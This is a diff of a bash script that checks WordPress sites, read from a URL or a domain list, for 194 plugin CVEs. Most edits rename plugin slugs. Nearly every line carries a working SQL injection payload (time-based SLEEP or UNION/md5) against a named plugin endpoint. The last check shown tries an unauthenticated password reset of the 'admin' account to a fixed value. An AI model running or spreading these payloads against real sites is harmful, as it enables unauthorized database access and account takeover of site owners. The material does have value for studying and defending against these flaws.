@@ -4,7 +4,7 @@
 # 194 CVEs: SQLi, Auth Bypass, PrivEsc
 # Usage: ./validate_wp_sqli.sh [-o DIR] [--csv] <url|domains.txt|nuclei_out.txt>
 # ============================================================
-set -euo pipefail
+set -uo pipefail
 IFS=$'\n\t'
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -138,74 +138,74 @@ check_plugin_only() {
     log_vuln "$DOMAIN" "$CVE" "PLUGIN_PRESENT" "${PLUGIN} installed — requires auth: use nuclei -t wp_sqli/${CVE}.yaml" "sqli"
 }
 
-_check_CVE_2015_2196() { check_time_get "$1" "$2" 'CVE-2015-2196' 'spider_calendar' '/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=1)+AND+(SELECT+1183+FROM+(SELECT(SLEEP(6)))UPad)+AND+(9752=9752&type=json'; }
+_check_CVE_2015_2196() { check_time_get "$1" "$2" 'CVE-2015-2196' 'spider-calendar' '/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=1)+AND+(SELECT+1183+FROM+(SELECT(SLEEP(6)))UPad)+AND+(9752=9752&type=json'; }
 _check_CVE_2015_4062() { check_plugin_only "$1" "$2" 'CVE-2015-4062' 'newstatpress'; }
 _check_CVE_2015_9323() { check_plugin_only "$1" "$2" 'CVE-2015-9323' '404_to_301'; }
 _check_CVE_2016_10940() { check_plugin_only "$1" "$2" 'CVE-2016-10940' 'zm-gallery'; }
 _check_CVE_2017_8295() { check_plugin_only "$1" "$2" 'CVE-2017-8295' ''; }
 _check_CVE_2018_16159() { check_time_post "$1" "$2" 'CVE-2018-16159' 'gift-voucher' '/wp-admin/admin-ajax.php' 'action=wpgv_doajax_front_template&template_id=1 and sleep(6)#'; }
-_check_CVE_2019_10692() { check_plugin_only "$1" "$2" 'CVE-2019-10692' 'wp_go_maps'; }
-_check_CVE_2020_11530() { check_time_get "$1" "$2" 'CVE-2020-11530' 'chop_slider' '/wp-content/plugins/chopslider/get_script/index.php?id=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))A)'; }
+_check_CVE_2019_10692() { check_plugin_only "$1" "$2" 'CVE-2019-10692' 'wp-go-maps'; }
+_check_CVE_2020_11530() { check_time_get "$1" "$2" 'CVE-2020-11530' 'chop-slider' '/wp-content/plugins/chopslider/get_script/index.php?id=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))A)'; }
 _check_CVE_2020_13640() { check_plugin_only "$1" "$2" 'CVE-2020-13640' 'wpdiscuz'; }
-_check_CVE_2020_14092() { check_plugin_only "$1" "$2" 'CVE-2020-14092' 'paypal_pro'; }
-_check_CVE_2020_27481() { check_time_post "$1" "$2" 'CVE-2020-27481' 'good_learning_management_system' '/wp-admin/admin-ajax.php' 'action=gdlr_lms_cancel_booking&id=(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))MrMV)'; }
+_check_CVE_2020_14092() { check_plugin_only "$1" "$2" 'CVE-2020-14092' 'paypal-pro'; }
+_check_CVE_2020_27481() { check_time_post "$1" "$2" 'CVE-2020-27481' 'good-learning-management-system' '/wp-admin/admin-ajax.php' 'action=gdlr_lms_cancel_booking&id=(SELECT%201337%20FROM%20(SELECT(SLEEP(6)))MrMV)'; }
 _check_CVE_2020_27615() { check_time_get "$1" "$2" 'CVE-2020-27615' 'loginizer' '/wp-content/plugins/loginizer/readme.txt'; }
 _check_CVE_2020_5766() { check_time_get "$1" "$2" 'CVE-2020-5766' 'srs-simple-hits-counter' '/'; }
 _check_CVE_2020_8772() { check_plugin_only "$1" "$2" 'CVE-2020-8772' 'iwp-client'; }
-_check_CVE_2021_24139() { check_time_get "$1" "$2" 'CVE-2021-24139' 'photo_gallery' '/index.php?rest_route=/wp/v2/pages'; }
+_check_CVE_2021_24139() { check_time_get "$1" "$2" 'CVE-2021-24139' 'photo-gallery' '/index.php?rest_route=/wp/v2/pages'; }
 _check_CVE_2021_24285() { check_plugin_only "$1" "$2" 'CVE-2021-24285' 'cars-seller-auto-classifieds-script'; }
 _check_CVE_2021_24295() { check_plugin_only "$1" "$2" 'CVE-2021-24295' 'cleantalk-spam-protect'; }
 _check_CVE_2021_24340() { check_time_get "$1" "$2" 'CVE-2021-24340' 'wp-statistics' '/wp-content/plugins/wp-statistics/readme.txt'; }
 _check_CVE_2021_24442() { check_time_post "$1" "$2" 'CVE-2021-24442' 'polls-widget' '/wp-admin/admin-ajax.php?action=pollinsertvalues' 'question_id=1&poll_answer_securety=8df73ed4ee&date_answers%5B0%5D=SLEEP(5)'; }
 _check_CVE_2021_24554() { check_plugin_only "$1" "$2" 'CVE-2021-24554' 'paytm-pay'; }
 _check_CVE_2021_24627() { check_plugin_only "$1" "$2" 'CVE-2021-24627' 'g-auto-hyperlink'; }
-_check_CVE_2021_24666() { check_md5_get "$1" "$2" 'CVE-2021-24666' 'podlove_podcast_publisher' '/index.php?rest_route=/podlove/v1/social/services/contributor/1&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,md5('; }
-_check_CVE_2021_24731() { check_time_post "$1" "$2" 'CVE-2021-24731' 'pie_register' '/wp-json/pie/v1/login' 'user_login='\''+AND+(SELECT+8149+FROM+(SELECT(SLEEP(3)))NuqO)+AND+'\''YvuB'\''='\''YvuB&login_pass=a'; }
+_check_CVE_2021_24666() { check_md5_get "$1" "$2" 'CVE-2021-24666' 'podlove-podcast-publisher' '/index.php?rest_route=/podlove/v1/social/services/contributor/1&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,md5('; }
+_check_CVE_2021_24731() { check_time_post "$1" "$2" 'CVE-2021-24731' 'pie-register' '/wp-json/pie/v1/login' 'user_login='\''+AND+(SELECT+8149+FROM+(SELECT(SLEEP(3)))NuqO)+AND+'\''YvuB'\''='\''YvuB&login_pass=a'; }
 _check_CVE_2021_24750() { check_plugin_only "$1" "$2" 'CVE-2021-24750' 'wp_visitor_statistics_\(real_time_traffic\)'; }
-_check_CVE_2021_24762() { check_time_get "$1" "$2" 'CVE-2021-24762' 'perfect_survey' '/wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(7)))HQYx)'; }
+_check_CVE_2021_24762() { check_time_get "$1" "$2" 'CVE-2021-24762' 'perfect-survey' '/wp-admin/admin-ajax.php?action=get_question&question_id=1%20AND%20(SELECT%207242%20FROM%20(SELECT(SLEEP(7)))HQYx)'; }
 _check_CVE_2021_24786() { check_plugin_only "$1" "$2" 'CVE-2021-24786' 'download-monitor'; }
-_check_CVE_2021_24791() { check_plugin_only "$1" "$2" 'CVE-2021-24791' 'header_footer_code_manager'; }
-_check_CVE_2021_24827() { check_time_get "$1" "$2" 'CVE-2021-24827' 'asgaros_forum' '/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(6)'; }
+_check_CVE_2021_24791() { check_plugin_only "$1" "$2" 'CVE-2021-24791' 'header-footer-code-manager'; }
+_check_CVE_2021_24827() { check_time_get "$1" "$2" 'CVE-2021-24827' 'asgaros-forum' '/forum/?subscribe_topic=1%20union%20select%201%20and%20sleep(6)'; }
 _check_CVE_2021_24849() { check_time_get "$1" "$2" 'CVE-2021-24849' 'wc-multivendor-marketplace' '/wp-content/plugins/wc-multivendor-marketplace/readme.txt'; }
 _check_CVE_2021_24862() { check_plugin_only "$1" "$2" 'CVE-2021-24862' 'registrationmagic'; }
 _check_CVE_2021_24915() { check_plugin_only "$1" "$2" 'CVE-2021-24915' 'contest-gallery'; }
-_check_CVE_2021_24931() { check_time_get "$1" "$2" 'CVE-2021-24931' 'secure_copy_content_protection_and_content_locking' '/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20AND%20(SELECT%205921%20FROM%20(SELECT(SLEEP(6)))LxjM)%20AND%20(7754=775&type=json'; }
+_check_CVE_2021_24931() { check_time_get "$1" "$2" 'CVE-2021-24931' 'secure-copy-content-protection-and-content-locking' '/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)%20AND%20(SELECT%205921%20FROM%20(SELECT(SLEEP(6)))LxjM)%20AND%20(7754=775&type=json'; }
 _check_CVE_2021_24943() { check_time_post "$1" "$2" 'CVE-2021-24943' 'registrations-for-the-events-calendar' '/wp-admin/admin-ajax.php?action=rtec_send_unregister_link' 'event_id=3 AND (SELECT 1874 FROM (SELECT(SLEEP(5)))vNpy)&email={{text}}@{{text}}.com'; }
-_check_CVE_2021_24946() { check_time_get "$1" "$2" 'CVE-2021-24946' 'modern_events_calendar_lite' '/wp-admin/admin-ajax.php?action=mec_load_single_page&time=1))%20UNION%20SELECT%20sleep(6)%20--%20g'; }
+_check_CVE_2021_24946() { check_time_get "$1" "$2" 'CVE-2021-24946' 'modern-events-calendar-lite' '/wp-admin/admin-ajax.php?action=mec_load_single_page&time=1))%20UNION%20SELECT%20sleep(6)%20--%20g'; }
 _check_CVE_2021_25114() { check_time_get "$1" "$2" 'CVE-2021-25114' 'paid-memberships-pro' '/?rest_route=/pmpro/v1/checkout_level&level_id=3&discount_code=%27%20%20union%20select%20sleep(6)%20--%20g'; }
-_check_CVE_2021_32789() { check_plugin_only "$1" "$2" 'CVE-2021-32789' 'woocommerce_blocks'; }
+_check_CVE_2021_32789() { check_plugin_only "$1" "$2" 'CVE-2021-32789' 'woocommerce-blocks'; }
 _check_CVE_2022_0169() { check_md5_get "$1" "$2" 'CVE-2022-0169' 'photo-gallery' '/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1&bwg_tag_id_bwg_thumbnails_0[]=)%22%20union%20select%201,2,3,4,5,6,7,concat(md5({{num}}),%200x2c,%208),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20--%20g'; }
 _check_CVE_2022_0228() { check_plugin_only "$1" "$2" 'CVE-2022-0228' 'popup-builder'; }
 _check_CVE_2022_0349() { check_time_post "$1" "$2" 'CVE-2022-0349' 'notificationx' '/?rest_route=/notificationx/v1/analytics' 'nx_id=sleep(6) -- x'; }
-_check_CVE_2022_0412() { check_time_get "$1" "$2" 'CVE-2022-0412' 'ti_woocommerce_wishlist' '/?rest_route=/wc/v3/wishlist/remove_product/1&item_id=0%20union%20select%20sleep(7)%20--%20g'; }
-_check_CVE_2022_0434() { check_md5_get "$1" "$2" 'CVE-2022-0434' 'page_view_count' '/?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5({{num}}),null,null%20--%20g'; }
+_check_CVE_2022_0412() { check_time_get "$1" "$2" 'CVE-2022-0412' 'ti-woocommerce-wishlist' '/?rest_route=/wc/v3/wishlist/remove_product/1&item_id=0%20union%20select%20sleep(7)%20--%20g'; }
+_check_CVE_2022_0434() { check_md5_get "$1" "$2" 'CVE-2022-0434' 'page-view-count' '/?rest_route=/pvc/v1/increase/1&post_ids=0)%20union%20select%20md5({{num}}),null,null%20--%20g'; }
 _check_CVE_2022_0439() { check_plugin_only "$1" "$2" 'CVE-2022-0439' ''; }
 _check_CVE_2022_0479() { check_plugin_only "$1" "$2" 'CVE-2022-0479' 'popup-builder'; }
 _check_CVE_2022_0592() { check_time_get "$1" "$2" 'CVE-2022-0592' 'mapsvg' '/wp-json/mapsvg/v1/maps/2?id=1%27%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(6)))b)--+'; }
 _check_CVE_2022_0651() { check_time_get "$1" "$2" 'CVE-2022-0651' 'wp-statistics' '/'; }
 _check_CVE_2022_0658() { check_time_post "$1" "$2" 'CVE-2022-0658' 'commonsbooking' '/wp-admin/admin-ajax.php' 'action=calendar_data&sd=2099-02-13&ed=2099-02-13&item=1&location=(SELECT+1743+FROM+(SELECT(SLEEP(6)))iXxL3)'; }
-_check_CVE_2022_0693() { check_time_get "$1" "$2" 'CVE-2022-0693' 'master_elements' '/wp-admin/admin-ajax.php?meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition'; }
-_check_CVE_2022_0747() { check_time_post "$1" "$2" 'CVE-2022-0747' 'infographic_maker' '/wp-admin/admin-ajax.php' 'action=qcld_upvote_action&post_id=1+AND+(SELECT+1626+FROM+(SELECT(SLEEP(6)))niPH)'; }
-_check_CVE_2022_0760() { check_time_post "$1" "$2" 'CVE-2022-0760' 'simple_link_directory' '/wp-admin/admin-ajax.php' 'action=qcopd_upvote_action&post_id=(SELECT 3 FROM (SELECT SLEEP(7))enz)'; }
-_check_CVE_2022_0769() { check_time_post "$1" "$2" 'CVE-2022-0769' 'users_ultra' '/wp-admin/admin-ajax.php' 'action=rating_vote&data_id=1&data_target=vote_score+%3d+1+AND+(SELECT+3+FROM+(SELECT(SLEEP(6)))gwe)--+'; }
+_check_CVE_2022_0693() { check_time_get "$1" "$2" 'CVE-2022-0693' 'master-elements' '/wp-admin/admin-ajax.php?meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition'; }
+_check_CVE_2022_0747() { check_time_post "$1" "$2" 'CVE-2022-0747' 'infographic-maker' '/wp-admin/admin-ajax.php' 'action=qcld_upvote_action&post_id=1+AND+(SELECT+1626+FROM+(SELECT(SLEEP(6)))niPH)'; }
+_check_CVE_2022_0760() { check_time_post "$1" "$2" 'CVE-2022-0760' 'simple-link-directory' '/wp-admin/admin-ajax.php' 'action=qcopd_upvote_action&post_id=(SELECT 3 FROM (SELECT SLEEP(7))enz)'; }
+_check_CVE_2022_0769() { check_time_post "$1" "$2" 'CVE-2022-0769' 'users-ultra' '/wp-admin/admin-ajax.php' 'action=rating_vote&data_id=1&data_target=vote_score+%3d+1+AND+(SELECT+3+FROM+(SELECT(SLEEP(6)))gwe)--+'; }
 _check_CVE_2022_0773() { check_time_post "$1" "$2" 'CVE-2022-0773' 'documentor' '/wp-admin/admin-ajax.php' 'action=doc_search_results&term=&docid=1+AND+(SELECT+6288+FROM+(SELECT(SLEEP(6)))HRaz)'; }
-_check_CVE_2022_0781() { check_md5_get "$1" "$2" 'CVE-2022-0781' 'nirweb_support' '/wp-admin/admin-ajax.php'; }
+_check_CVE_2022_0781() { check_md5_get "$1" "$2" 'CVE-2022-0781' 'nirweb-support' '/wp-admin/admin-ajax.php'; }
 _check_CVE_2022_0783() { check_time_post "$1" "$2" 'CVE-2022-0783' 'multiple-shipping-address-woocommerce' '/wp-admin/admin-ajax.php' 'action=ocwma_choice_address&sid=3+AND+(SELECT+1946+FROM+(SELECT(SLEEP(7)))zsme)'; }
-_check_CVE_2022_0784() { check_time_post "$1" "$2" 'CVE-2022-0784' 'title_experiments_free' '/wp-admin/admin-ajax.php' 'action=wpex_titles&id[]=1 AND (SELECT 321 FROM (SELECT(SLEEP(6)))je)'; }
-_check_CVE_2022_0785() { check_time_get "$1" "$2" 'CVE-2022-0785' 'daily_prayer_time' '/wp-admin/admin-ajax.php?action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn)'; }
+_check_CVE_2022_0784() { check_time_post "$1" "$2" 'CVE-2022-0784' 'title-experiments-free' '/wp-admin/admin-ajax.php' 'action=wpex_titles&id[]=1 AND (SELECT 321 FROM (SELECT(SLEEP(6)))je)'; }
+_check_CVE_2022_0785() { check_time_get "$1" "$2" 'CVE-2022-0785' 'daily-prayer-time' '/wp-admin/admin-ajax.php?action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn)'; }
 _check_CVE_2022_0786() { check_time_get "$1" "$2" 'CVE-2022-0786' 'kivicare' '/wp-admin/admin-ajax.php?action=ajax_get&route_name=get_doctor_details&clinic_id=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b'; }
-_check_CVE_2022_0787() { check_time_post "$1" "$2" 'CVE-2022-0787' 'limit_login_attempts' '/wp-admin/admin-ajax.php' 'action=WPLFLA_get_log_data&order[][column]=0&columns[][data]=(SELECT+7382+FROM+(SELECT(SLEEP(6)))ameU)'; }
-_check_CVE_2022_0788() { check_time_get "$1" "$2" 'CVE-2022-0788' 'wp_fundraising_donation_and_crowdfunding_platform' '/index.php?rest_route=/xs-donate-form/payment-redirect/3'; }
+_check_CVE_2022_0787() { check_time_post "$1" "$2" 'CVE-2022-0787' 'limit-login-attempts' '/wp-admin/admin-ajax.php' 'action=WPLFLA_get_log_data&order[][column]=0&columns[][data]=(SELECT+7382+FROM+(SELECT(SLEEP(6)))ameU)'; }
+_check_CVE_2022_0788() { check_time_get "$1" "$2" 'CVE-2022-0788' 'wp-fundraising-donation-and-crowdfunding-platform' '/index.php?rest_route=/xs-donate-form/payment-redirect/3'; }
 _check_CVE_2022_0814() { check_plugin_only "$1" "$2" 'CVE-2022-0814' 'ubigeo-peru'; }
 _check_CVE_2022_0817() { check_md5_get "$1" "$2" 'CVE-2022-0817' 'badgeos' '/wp-admin/admin-ajax.php'; }
 _check_CVE_2022_0826() { check_time_post "$1" "$2" 'CVE-2022-0826' 'wp-video-gallery-free' '/wp-admin/admin-ajax.php' 'action=wp_video_gallery_ajax_add_single_youtube&url=http://oast.me/?x%26v=1%2522 AND (SELECT 1780 FROM (SELECT(SLEEP(6)))uPaz)%2523'; }
 _check_CVE_2022_0827() { check_time_post "$1" "$2" 'CVE-2022-0827' 'bestbooks' '/wp-admin/admin-ajax.php' 'action=bestbooks_add_transaction&type=x&account=x&date=x&description=1&debit=(CASE WHEN (9277=9277) THEN SLEEP(6) ELSE 9277 END)&credit=1'; }
 _check_CVE_2022_0846() { check_time_post "$1" "$2" 'CVE-2022-0846' 'speakout\!_email_petitions' '/wp-admin/admin-ajax.php' 'action=dk_speakout_sendmail&id=12+AND+(SELECT+5023+FROM+(SELECT(SLEEP(6)))Fvrh)--+VoFu'; }
-_check_CVE_2022_0867() { check_time_post "$1" "$2" 'CVE-2022-0867' 'pricing_table' '/wp-admin/admin-ajax.php' 'action=arplite_insert_plan_id&arp_plan_id=x&arp_template_id=1+AND+(SELECT+8948+FROM+(SELECT(SLEEP(6)))iIic)'; }
-_check_CVE_2022_0948() { check_time_post "$1" "$2" 'CVE-2022-0948' 'order_listener_for_woocommerce' '/?rest_route=/olistener/new' '{"id":" (SLEEP(6))#"}'; }
-_check_CVE_2022_0949() { check_time_post "$1" "$2" 'CVE-2022-0949' 'block_and_stop_bad_bots' '/wp-admin/admin-ajax.php' 'action=stopbadbots_grava_fingerprint&fingerprint=0'; }
-_check_CVE_2022_1013() { check_time_post "$1" "$2" 'CVE-2022-1013' 'personal_dictionary' '/wp-admin/admin-ajax.php' 'action=ays_pd_ajax&function=ays_pd_game_find_word&groupsIds[]=1)+AND+(SELECT+3066+FROM+(SELECT(SLEEP(7)))CEHy)--+-'; }
-_check_CVE_2022_1057() { check_time_get "$1" "$2" 'CVE-2022-1057' 'pricing_deals_for_woocommerce' '/wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+-'; }
+_check_CVE_2022_0867() { check_time_post "$1" "$2" 'CVE-2022-0867' 'pricing-table' '/wp-admin/admin-ajax.php' 'action=arplite_insert_plan_id&arp_plan_id=x&arp_template_id=1+AND+(SELECT+8948+FROM+(SELECT(SLEEP(6)))iIic)'; }
+_check_CVE_2022_0948() { check_time_post "$1" "$2" 'CVE-2022-0948' 'order-listener-for-woocommerce' '/?rest_route=/olistener/new' '{"id":" (SLEEP(6))#"}'; }
+_check_CVE_2022_0949() { check_time_post "$1" "$2" 'CVE-2022-0949' 'block-and-stop-bad-bots' '/wp-admin/admin-ajax.php' 'action=stopbadbots_grava_fingerprint&fingerprint=0'; }
+_check_CVE_2022_1013() { check_time_post "$1" "$2" 'CVE-2022-1013' 'personal-dictionary' '/wp-admin/admin-ajax.php' 'action=ays_pd_ajax&function=ays_pd_game_find_word&groupsIds[]=1)+AND+(SELECT+3066+FROM+(SELECT(SLEEP(7)))CEHy)--+-'; }
+_check_CVE_2022_1057() { check_time_get "$1" "$2" 'CVE-2022-1057' 'pricing-deals-for-woocommerce' '/wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+-'; }
 _check_CVE_2022_1453() { check_time_get "$1" "$2" 'CVE-2022-1453' '' '/wp-json/rsvpmaker/v1/sked/1?post_id=(SELECT%209999%20FROM%20(SELECT(SLEEP(7)))a)'; }
 _check_CVE_2022_1768() { check_time_post "$1" "$2" 'CVE-2022-1768' 'rsvpmaker' '/wp-json/rsvpmaker/v1/stripesuccess/anythinghere' 'rsvp_id=(select(0)from(select(sleep(7)))a)&amount=1234&email=randomtext'; }
 _check_CVE_2022_1950() { check_time_post "$1" "$2" 'CVE-2022-1950' 'youzify' '/wp-admin/admin-ajax.php' 'action=youzify_media_pagination&data[type]=photos&page=1&data[group_id]=(SELECT 7958 FROM (SELECT(SLEEP(6)))XVfJ)'; }
@@ -223,18 +223,18 @@ _check_CVE_2022_4059() { check_time_get "$1" "$2" 'CVE-2022-4059' 'cryptocurrenc
 _check_CVE_2022_4117() { check_time_post "$1" "$2" 'CVE-2022-4117' 'iws-geo-form-fields' '/wp-admin/admin-ajax.php?action=iws_gff_fetch_states' 'country_id=1%20AND%20(SELECT%2042%20FROM%20(SELECT(SLEEP(6)))b)'; }
 _check_CVE_2022_4447() { check_md5_get "$1" "$2" 'CVE-2022-4447' 'fontsy' '/wp-admin/admin-ajax.php?action=get_tag_fonts'; }
 _check_CVE_2022_44588() { check_time_get "$1" "$2" 'CVE-2022-44588' 'cryptocurrency-widgets-pack' '/wp-admin/admin-ajax.php?action=mcwp_table&mcwp_id=1&draw=1&start=0&length=10&columns[0][name]=EXP(~(SELECT*FROM(SELECT+SLEEP(8))x))&order[0][column]=0&order[0][dir]=ASC'; }
-_check_CVE_2022_45805() { check_plugin_only "$1" "$2" 'CVE-2022-45805' 'payment_gateway'; }
+_check_CVE_2022_45805() { check_plugin_only "$1" "$2" 'CVE-2022-45805' 'payment-gateway'; }
 _check_CVE_2022_45808() { check_time_post "$1" "$2" 'CVE-2022-45808' 'learnpress' '/wp-json/lp/v1/courses/archive-course' 'c_search=X&order_by=ID AND (SELECT 1471 FROM (SELECT(SLEEP(6)))VcSO)&order=DESC&limit=10&return_type=html'; }
-_check_CVE_2023_0037() { check_time_post "$1" "$2" 'CVE-2023-0037' 'map_builder_for_google_maps' '/' 'radius=1+and+(SELECT+7741+FROM+(SELECT(SLEEP(7)))hlAf)&lat=0.0&lng=0.0&distance_in=km'; }
-_check_CVE_2023_0261() { check_plugin_only "$1" "$2" 'CVE-2023-0261' 'wp_tripadvisor_review_slider'; }
+_check_CVE_2023_0037() { check_time_post "$1" "$2" 'CVE-2023-0037' 'map-builder-for-google-maps' '/' 'radius=1+and+(SELECT+7741+FROM+(SELECT(SLEEP(7)))hlAf)&lat=0.0&lng=0.0&distance_in=km'; }
+_check_CVE_2023_0261() { check_plugin_only "$1" "$2" 'CVE-2023-0261' 'wp-tripadvisor-review-slider'; }
 _check_CVE_2023_0600() { check_time_get "$1" "$2" 'CVE-2023-0600' 'wp-stats-manager' '/wp-content/plugins/wp-statistics/readme.txt'; }
-_check_CVE_2023_0630() { check_plugin_only "$1" "$2" 'CVE-2023-0630' 'slimstat_analytics'; }
+_check_CVE_2023_0630() { check_plugin_only "$1" "$2" 'CVE-2023-0630' 'slimstat-analytics'; }
 _check_CVE_2023_0900() { check_plugin_only "$1" "$2" 'CVE-2023-0900' 'ap-pricing-tables-lite'; }
-_check_CVE_2023_1020() { check_plugin_only "$1" "$2" 'CVE-2023-1020' 'wp_live_chat_shoutbox'; }
+_check_CVE_2023_1020() { check_plugin_only "$1" "$2" 'CVE-2023-1020' 'wp-live-chat-shoutbox'; }
 _check_CVE_2023_1408() { check_plugin_only "$1" "$2" 'CVE-2023-1408' 'video-list-manager'; }
 _check_CVE_2023_1730() { check_time_get "$1" "$2" 'CVE-2023-1730' 'supportcandy' '/'; }
 _check_CVE_2023_23488() { check_time_get "$1" "$2" 'CVE-2023-23488' 'paid-memberships-pro' '/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(7)))a)--%20-'; }
-_check_CVE_2023_23489() { check_time_get "$1" "$2" 'CVE-2023-23489' 'easy_digital_downloads' '/wp-admin/admin-ajax.php?action=edd_download_search&s=1'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-'; }
+_check_CVE_2023_23489() { check_time_get "$1" "$2" 'CVE-2023-23489' 'easy-digital-downloads' '/wp-admin/admin-ajax.php?action=edd_download_search&s=1'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-'; }
 _check_CVE_2023_24000() { check_time_get "$1" "$2" 'CVE-2023-24000' 'gamipress' '/wp-json/wp/v2/gamipress-logs?trigger_type[]=test'\'')%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(6)))x)%20AND%20('\''a'\''='\''a'; }
 _check_CVE_2023_2437() { check_plugin_only "$1" "$2" 'CVE-2023-2437' 'userpro'; }
 _check_CVE_2023_2449() { check_plugin_only "$1" "$2" 'CVE-2023-2449' 'userpro'; }
@@ -260,7 +260,7 @@ _check_CVE_2023_6567() { check_time_get "$1" "$2" 'CVE-2023-6567' 'learnpress' '
 _check_CVE_2023_7337() { check_plugin_only "$1" "$2" 'CVE-2023-7337' ''; }
 _check_CVE_2024_0705() { check_time_get "$1" "$2" 'CVE-2024-0705' '' '/'; }
 _check_CVE_2024_10400() { check_md5_get "$1" "$2" 'CVE-2024-10400' 'tutor' '/wp-admin/admin-ajax.php'; }
-_check_CVE_2024_1061() { check_time_get "$1" "$2" 'CVE-2024-1061' 'html5_video_player' '/?rest_route=/h5vp/v1/view/1&id=1'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-'; }
+_check_CVE_2024_1061() { check_time_get "$1" "$2" 'CVE-2024-1061' 'html5-video-player' '/?rest_route=/h5vp/v1/view/1&id=1'\''+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-'; }
 _check_CVE_2024_1071() { check_time_get "$1" "$2" 'CVE-2024-1071' 'ultimate-member' '/?p=1'; }
 _check_CVE_2024_10924() { check_plugin_only "$1" "$2" 'CVE-2024-10924' 'really-simple-ssl'; }
 _check_CVE_2024_11728() { check_time_get "$1" "$2" 'CVE-2024-11728' 'kivicare-clinic-management-system' '/'; }
@@ -290,7 +290,7 @@ _check_CVE_2024_43917() { check_time_get "$1" "$2" 'CVE-2024-43917' 'ti-woocomme
 _check_CVE_2024_43965() { check_plugin_only "$1" "$2" 'CVE-2024-43965' ''; }
 _check_CVE_2024_4434() { check_time_get "$1" "$2" 'CVE-2024-4434' 'learnpress' '/'; }
 _check_CVE_2024_4443() { check_time_post "$1" "$2" 'CVE-2024-4443' 'business-directory-plugin' '/business-directory/?dosrch=1&q=&wpbdp_view=search&listingfields[+or+sleep(if(1%3d1,6,0))+))--+-][1]=' 'matchers:'; }
-_check_CVE_2024_5057() { check_time_get "$1" "$2" 'CVE-2024-5057' 'easy_digital_downloads' '/wp-admin/admin-ajax.php?action=edd_download_search&s=a'\'')/**/AND/**/SLEEP(6)%23'; }
+_check_CVE_2024_5057() { check_time_get "$1" "$2" 'CVE-2024-5057' 'easy-digital-downloads' '/wp-admin/admin-ajax.php?action=edd_download_search&s=a'\'')/**/AND/**/SLEEP(6)%23'; }
 _check_CVE_2024_5522() { check_md5_get "$1" "$2" 'CVE-2024-5522' 'html5-video-player' '/wp-json/h5vp/v1/video/0?id='; }
 _check_CVE_2024_5765() { check_time_get "$1" "$2" 'CVE-2024-5765' 'wpstickybar-sticky-bar-sticky-header' '/'; }
 _check_CVE_2024_5975() { check_time_get "$1" "$2" 'CVE-2024-5975' 'cz-loan-management' '/wp-content/plugins/cz-loan-management/README.txt'; }
@@ -305,7 +305,7 @@ _check_CVE_2024_7854() { check_time_get "$1" "$2" 'CVE-2024-7854' 'woo-inquiry' 
 _check_CVE_2024_8484() { check_time_get "$1" "$2" 'CVE-2024-8484' 'rest-api-to-miniprogram' '/'; }
 _check_CVE_2024_8522() { check_time_get "$1" "$2" 'CVE-2024-8522' 'learnpress' '/wp-json/learnpress/v1/courses?course_filter=&c_only_fields=post_title,(select(sleep(6))),ID&'; }
 _check_CVE_2024_8529() { check_time_get "$1" "$2" 'CVE-2024-8529' 'learnpress' '/wp-json/learnpress/v1/courses?c_fields=(SELECT(0)FROM(SELECT(SLEEP(6)))a)'; }
-_check_CVE_2024_8625() { check_plugin_only "$1" "$2" 'CVE-2024-8625' 'ts_poll'; }
+_check_CVE_2024_8625() { check_plugin_only "$1" "$2" 'CVE-2024-8625' 'ts-poll'; }
 _check_CVE_2024_8911() { check_time_post "$1" "$2" 'CVE-2024-8911' 'latepoint' '/wp-admin/admin-ajax.php' 'action=latepoint_route_call&route_name=customer_cabinet__change_password&params=password_reset_token%5bOR%5d%5b%20IS%20NULL%20or%20not%20(select%20sleep(8)))%20limit%201%3b--%20-%5d%3d{{randstr}}%26pa'; }
 _check_CVE_2024_9186() { check_time_get "$1" "$2" 'CVE-2024-9186' 'wp-marketing-automations' '/'; }
 _check_CVE_2024_9796() { check_plugin_only "$1" "$2" 'CVE-2024-9796' 'wp-advanced-search'; }
@@ -343,7 +343,8 @@ _check_CVE_2023_32243() {
     local RESP; RESP=$(http_probe "${BASE_URL}/wp-admin/admin-ajax.php?action=eael-resetpassword" POST 'page_id=0&widget_id=0&eael-reset-pass-nonce=invalid&uname=admin&password=Probe1234!')
     local BODY=$(echo "$RESP"|head -n -1) STATUS=$(echo "$RESP"|tail -1)
     if echo "$BODY"|grep -qiE '"success".*true|password_changed'; then log_vuln "$DOMAIN" "$CVE" "CONFIRMED" "reset without token" "auth-bypass"
